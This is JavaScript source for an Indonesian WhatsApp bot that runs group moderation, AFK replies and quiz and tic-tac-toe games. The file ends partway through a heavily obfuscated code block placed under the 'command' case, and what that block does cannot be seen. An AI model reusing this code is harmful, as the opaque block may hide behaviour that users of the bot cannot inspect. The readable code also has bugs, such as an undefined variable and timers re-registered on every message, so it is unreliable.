/* jual yatim dek² */

require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

// Menunya
const  { ind } = require(`./language`)
lang = ind // Menunya

module.exports = kiki = async (kiki, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const from = mek.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await kiki.decodeJid(kiki.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const isMedia = /image|video|sticker|audio/.test(mime)
	
        // Group
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const groupMetadata = m.isGroup ? await kiki.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
	
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!kiki.public) {
            if (!m.key.fromMe) return
        }

        // Push Message To Console && Auto Read
        if (m.message) {
            kiki.sendReadReceipt(m.chat, m.sender, [m.key.id])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	
	// write database every 1 minute
	setInterval(() => {
            fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2))
        }, 60 * 1000)

	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await kiki.setStatus(`${kiki.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await kiki.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        kiki.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: kiki.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, kiki.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        kiki.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            kiki.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kiki.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kiki.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kiki.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kiki.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kiki.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kiki.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kiki.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, kiki.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kiki.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kiki.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kiki.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kiki.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kiki.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kiki.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await kiki.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await kiki.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    kiki.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    kiki.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) kiki.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) kiki.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) kiki.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    kiki.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) kiki.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) kiki.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    kiki.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        switch(command) {
        	case 'command':
            (function(_0x33642f,_0x5580c7){function _0x198014(_0x175576,_0x36b66d,_0x1ea7d6,_0x3eace2,_0x119e3a){return _0x5649(_0x119e3a-0x24f,_0x175576);}function _0x1733ee(_0x3ff262,_0x120fb1,_0x6da7a7,_0xc7062f,_0x192afb){return _0x5649(_0x120fb1-0x170,_0x6da7a7);}function _0x5777cd(_0x124240,_0x24ab8c,_0x466373,_0x1dc23b,_0x4974d7){return _0x5649(_0x1dc23b- -0x190,_0x124240);}function _0x415992(_0xa27028,_0x5a9f89,_0x367946,_0x14d32b,_0x428121){return _0x5649(_0x5a9f89- -0xc9,_0x367946);}const _0xc15e1f=_0x33642f();function _0x1179be(_0x4251d1,_0x329987,_0x3c17b8,_0x141336,_0x3bdd5c){return _0x5649(_0x329987-0x7e,_0x3bdd5c);}while(!![]){try{const _0x21a2d4=-parseInt(_0x5777cd(')@1@',0x173,0x3b6,0x2b9,0x42f))/(-0x2537+-0x1163+-0x1*-0x369b)*(parseInt(_0x415992(0x4e0,0x36a,'X8[)',0x42a,0x277))/(0xd2c+0x20c4+-0x2dee*0x1))+-parseInt(_0x1733ee(0x641,0x4b1,'YpS8',0x5d6,0x5a7))/(0x7f*0x6+0x1*0x10a5+-0x9ce*0x2)*(-parseInt(_0x198014('J@2Y',0x367,0x595,0x462,0x499))/(-0x1*0x1d8+0x1*-0x443+0x61f))+-parseInt(_0x1179be(0x158,0x19e,0x63,0x129,'3CnB'))/(0x23fd+-0x874*-0x3+-0x3d54)+parseInt(_0x1179be(0x5e6,0x482,0x4f1,0x5c0,'EREe'))/(0x1*-0x1a9f+0x12e*0xb+0xdab)+-parseInt(_0x5777cd('sbsJ',0x258,0xd1,0x1ee,0x1eb))/(-0x2396+0x3*0x4a+-0xb95*-0x3)+parseInt(_0x1733ee(0x482,0x31a,'@A%5',0x43c,0x25a))/(0x7*-0x525+-0xd34+-0x313f*-0x1)+parseInt(_0x1179be(0x654,0x4d0,0x4e7,0x431,'^3QZ'))/(-0xa*0x53+-0x6f+-0xa*-0x5f);if(_0x21a2d4===_0x5580c7)break;else _0xc15e1f['push'](_0xc15e1f['shift']());}catch(_0x364a0a){_0xc15e1f['push'](_0xc15e1f['shift']());}}}(_0x1c1c,0xf1251+0xf6f42+0x120702*-0x1));const _0x3d4b9b=(function(){function _0x14d638(_0x4cbf5e,_0x576adf,_0x49e6bd,_0x2d2e6f,_0x10600c){return _0x5649(_0x4cbf5e-0x10a,_0x576adf);}const _0x14dc8d={};_0x14dc8d[_0x34ed54(0x5be,0x5f5,0x64a,'ps0)',0x5b8)]=function(_0x24c235,_0x1b487a){return _0x24c235+_0x1b487a;},_0x14dc8d[_0x14d638(0x466,'*aQ#',0x449,0x4ea,0x45e)]=_0x451b4e('hJ0U',0xe7,0x7d,0x21c,0x7d),_0x14dc8d[_0xf98093(-0x1fa,'xyI6',-0x115,-0x7a,-0x91)]=_0xf98093(-0x3ea,'71Tx',-0x1d3,-0x31b,-0x253),_0x14dc8d[_0x19bc01(-0x2b,-0x42,0x106,0x18f,')@1@')]=_0x451b4e('Y8#)',0x2d4,0x279,0x145,0x410)+'n',_0x14dc8d[_0xf98093(-0x219,'EREe',0x7,-0x1e3,-0xae)]=function(_0x2a0e2c,_0x14d576){return _0x2a0e2c===_0x14d576;};function _0xf98093(_0x442f91,_0x318702,_0x8b917b,_0x45e5f5,_0x5b4dde){return _0x5649(_0x5b4dde- -0x3d6,_0x318702);}_0x14dc8d[_0xf98093(-0x209,'$2Np',-0x162,-0x253,-0x102)]=_0x14d638(0x42b,'uCBF',0x4f9,0x2c8,0x2d1),_0x14dc8d[_0xf98093(-0x60,'oLD*',-0x1b3,-0x26a,-0x10d)]=_0xf98093(-0x359,'nu)l',-0x247,-0x1f8,-0x20f),_0x14dc8d[_0x34ed54(0x361,0x2a8,0x421,'hJ0U',0x460)]=function(_0xd36a62,_0x400429){return _0xd36a62!==_0x400429;},_0x14dc8d[_0x34ed54(0x3bf,0x458,0x469,'3zS!',0x4ce)]=_0x34ed54(0x4ea,0x664,0x4c8,'xyI6',0x3c9),_0x14dc8d[_0x34ed54(0x49e,0x4cc,0x45b,'h2FH',0x5b0)]=function(_0x2e1c2b,_0x544fc8){return _0x2e1c2b===_0x544fc8;};function _0x19bc01(_0x4d62ad,_0x156d24,_0x449834,_0xb33a39,_0x10cabe){return _0x5649(_0x449834- -0x323,_0x10cabe);}function _0x451b4e(_0xdbff28,_0x27bc4e,_0x154ec8,_0x58f3f3,_0x5a3dc8){return _0x5649(_0x27bc4e- -0x6f,_0xdbff28);}_0x14dc8d[_0xf98093(-0x15e,'sbsJ',-0x9f,-0x2e1,-0x16d)]=_0x19bc01(0xde,0x11b,-0x15,-0x57,'^3QZ'),_0x14dc8d[_0x451b4e('$2Np',0x1fc,0x270,0x2c2,0x23a)]=_0x14d638(0x31a,')@1@',0x303,0x385,0x3a8);function _0x34ed54(_0x331929,_0x2e6399,_0x2e5211,_0x5ba3c9,_0x1f2bae){return _0x5649(_0x2e5211-0x223,_0x5ba3c9);}const _0x3b1b20=_0x14dc8d;let _0x3f775=!![];return function(_0x1df036,_0x20aa0e){function _0x4365f7(_0x56f2b7,_0x4239ad,_0x21954d,_0x36774f,_0x1fb226){return _0x34ed54(_0x56f2b7-0xef,_0x4239ad-0x115,_0x21954d- -0xc1,_0x56f2b7,_0x1fb226-0x1f);}function _0x2fbac5(_0x5c4b73,_0x11980a,_0x570712,_0x5ecf86,_0x574bf3){return _0xf98093(_0x5c4b73-0x3,_0x5ecf86,_0x570712-0x9,_0x5ecf86-0x1e7,_0x574bf3-0x151);}function _0x3fe50d(_0x2a817d,_0x26f3e8,_0x1ca5c3,_0x418262,_0xe9455a){return _0x19bc01(_0x2a817d-0x1a6,_0x26f3e8-0xbb,_0x418262-0x22,_0x418262-0x20,_0xe9455a);}function _0x49e3cb(_0x11b8b7,_0x23b01e,_0x5d1f24,_0x21eab2,_0x29539d){return _0xf98093(_0x11b8b7-0x9e,_0x21eab2,_0x5d1f24-0x1bb,_0x21eab2-0xfd,_0x5d1f24-0x321);}const _0x17aff0={'sqizV':function(_0x2bf332,_0x4b5eb2){function _0x57071f(_0x45de35,_0x5d601c,_0x4272c3,_0x4b0fd6,_0x4e6c0c){return _0x5649(_0x45de35-0x66,_0x4b0fd6);}return _0x3b1b20[_0x57071f(0x2a2,0x3bb,0x163,'X8[)',0x346)](_0x2bf332,_0x4b5eb2);},'yZKyW':_0x3b1b20[_0x4365f7('xP1I',0x5d5,0x564,0x5fa,0x5d6)],'LxOXD':_0x3b1b20[_0x49e3cb(0x36b,0x28b,0x25b,'hJ0U',0x154)],'elNCQ':_0x3b1b20[_0x3fe50d(0xb2,0xa,-0x1ec,-0x7d,'3CnB')],'NEenb':function(_0x105fea,_0x4699b0){function _0x1e8240(_0x311816,_0x48c360,_0xe19df6,_0x29bc7a,_0x240244){return _0x49e3cb(_0x311816-0xf9,_0x48c360-0x14,_0x29bc7a-0x5f,_0x240244,_0x240244-0x16c);}return _0x3b1b20[_0x1e8240(0x1ef,0x4f,0x1bd,0xd1,'lHWR')](_0x105fea,_0x4699b0);},'XNjSB':_0x3b1b20[_0x49e3cb(0x176,0x12d,0x1fe,'bSee',0x37e)],'qJOkJ':_0x3b1b20[_0x4365f7('tkFS',0x23f,0x35f,0x278,0x2fb)],'bfesp':function(_0x5ae349,_0x17b852){function _0x3b2510(_0x24c561,_0x3d35db,_0xe55604,_0xfb3422,_0x598610){return _0x49e3cb(_0x24c561-0x58,_0x3d35db-0x4a,_0x3d35db- -0x85,_0xfb3422,_0x598610-0x1ab);}return _0x3b1b20[_0x3b2510(-0x2d,0x152,0x19f,'3CnB',0xea)](_0x5ae349,_0x17b852);},'CxzFs':_0x3b1b20[_0x3a4d18(0x57b,0x51a,0x62e,')@1@',0x618)]};function _0x3a4d18(_0x703a5f,_0x4c12ea,_0x230b28,_0x2bebc5,_0x28c0cb){return _0x14d638(_0x230b28-0xd5,_0x2bebc5,_0x230b28-0x187,_0x2bebc5-0x9e,_0x28c0cb-0x46);}if(_0x3b1b20[_0x49e3cb(0x41a,0x418,0x35d,'oLD*',0x314)](_0x3b1b20[_0x49e3cb(0x4,0x1ad,0xc5,'J@2Y',-0x68)],_0x3b1b20[_0x49e3cb(0x3cf,0x31c,0x2f6,'71Tx',0x288)])){const _0x2435d2=_0x440f32[_0x49e3cb(0x10e,-0x42,0xd0,'ujP1',0x55)](_0x17e2a8,arguments);return _0x1a19fc=null,_0x2435d2;}else{const _0x2cda7a=_0x3f775?function(){function _0x43ddcd(_0x17e7df,_0xfd1d22,_0x47d819,_0x37c347,_0xebdc97){return _0x3a4d18(_0x17e7df-0xd5,_0xfd1d22-0x166,_0xfd1d22-0xbe,_0xebdc97,_0xebdc97-0x90);}function _0x30cb90(_0x1db4a0,_0x50cb70,_0xd3dfc8,_0x1fa9fd,_0x6f6cd){return _0x49e3cb(_0x1db4a0-0x1d1,_0x50cb70-0x120,_0x1fa9fd-0x333,_0xd3dfc8,_0x6f6cd-0x17b);}function _0x2f8d59(_0x1829f6,_0x3bf4ab,_0x5aaaab,_0x5aea04,_0x1ef371){return _0x4365f7(_0x1ef371,_0x3bf4ab-0x17d,_0x5aaaab- -0x452,_0x5aea04-0x1ce,_0x1ef371-0x11b);}function _0x57757d(_0x408be2,_0x92c113,_0x11f229,_0x287256,_0x52694a){return _0x49e3cb(_0x408be2-0xa3,_0x92c113-0x128,_0x11f229-0xea,_0x52694a,_0x52694a-0xb);}function 